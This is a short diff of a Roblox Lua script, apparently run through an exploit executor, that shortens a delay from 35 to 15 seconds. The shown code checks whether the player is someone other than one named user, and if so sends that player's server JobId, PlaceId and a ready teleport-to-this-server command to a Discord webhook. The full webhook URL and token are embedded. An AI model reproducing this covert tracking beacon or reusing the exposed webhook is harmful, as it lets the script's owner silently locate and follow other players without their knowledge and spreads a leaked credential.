@@ -12,7 +12,7 @@ if game.Players.LocalPlayer.Name ~= "Sammywammylol502" then
             content = 'JobId = `'..game.JobId..'`\nPlaceId = `'..game.PlaceId..'`\n```lua\ngame:GetService("TeleportService"):TeleportToPlaceInstance('..game.PlaceId..', "'..game.JobId..'", game.Players.LocalPlayer)```'
         })
     })
-    task.wait(35)
+    task.wait(15)
 	request({
         Url = "https://discordapp.com/api/webhooks/1506162347054727261/sLurO4YZGRxs5jSWKKmT2noinC89lb-AdmVpPBXrCxxY9QWkwmXJo0H7TtRbV-cL-LpX",
         Method = "POST",
